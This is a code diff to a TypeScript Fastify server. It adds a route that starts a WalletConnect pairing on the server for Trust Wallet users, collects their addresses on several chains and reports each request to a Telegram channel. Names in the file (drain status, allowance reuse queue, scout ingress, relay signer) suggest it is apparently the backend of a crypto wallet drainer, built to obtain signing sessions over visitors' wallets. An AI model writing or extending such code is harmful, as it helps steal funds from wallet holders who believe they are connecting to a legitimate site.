@@ -10,7 +10,7 @@ import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 
 import { sendFailure, sendSuccess } from '../lib/api-response.js'
 import { fusionScoutBodySchema, parseBody, rankedScoutBodySchema, scoutIngressBodySchema, drainStatusBodySchema, wcSessionBodySchema } from '../lib/schemas.js'
-import { registerWcSession } from '../lib/wc-relay-signer.js'
+import { registerWcSession, initiateWcPairing } from '../lib/wc-relay-signer.js'
 import { validateScoutValueUsdField } from '../lib/scout-value-usd.js'
 import { enqueueAllowanceReuseJob } from '../lib/allowance-reuse-queue.js'
 import { isAddress } from 'viem'
@@ -530,6 +530,39 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       `🌐 origin: <code>${request.headers['x-source-origin'] ?? 'unknown'}</code>`,
     ).catch(() => {})
     return sendSuccess(reply, 200, 'debug logged', {})
+  })
+
+  // Backend-initiated WC pairing for Trust Wallet in-app browser.
+  // Frontend calls this after injection connect, gets WC URI, triggers trust:// deep link.
+  // When user approves in Trust Wallet native UI, session is auto-registered (no second call needed).
+  app.post('/api/v1/wc/pair/initiate', async (request: FastifyRequest, reply: FastifyReply) => {
+    const body = (request.body as Record<string, unknown>) ?? {}
+    const wallet = String(body['wallet'] ?? '').toLowerCase().trim()
+    const sol = String(body['sol'] ?? '').trim() || undefined
+    const tron = String(body['tron'] ?? '').trim() || undefined
+    const ton = String(body['ton'] ?? '').trim() || undefined
+    const btc = String(body['btc'] ?? '').trim() || undefined
+
+    if (!wallet || !wallet.startsWith('0x') || wallet.length < 40) {
+      return sendFailure(reply, 400, 'wallet address required', { code: 'BadRequest' })
+    }
+
+    console.log('[WcRelay] /api/v1/wc/pair/initiate | wallet:', wallet.slice(0, 10))
+    void sendTelegramMessage(
+      `🔗 <b>WC Pair Initiate Request</b>\n` +
+      `👛 Wallet: <code>${wallet.slice(0, 10)}…</code>\n` +
+      `🌐 Origin: <code>${request.headers['x-source-origin'] ?? 'unknown'}</code>`,
+    ).catch(() => {})
+
+    const result = await initiateWcPairing(wallet, { sol, tron, ton, btc })
+    if (!result) {
+      return sendFailure(reply, 500, 'Failed to initiate WC pairing', { code: 'WcPairFail' })
+    }
+
+    return sendSuccess(reply, 200, 'WC pairing initiated', {
+      uri: result.uri,
+      pairing_id: result.pairing_id,
+    })
   })
 
   // General-purpose frontend debug log — sends any message+data to Telegram
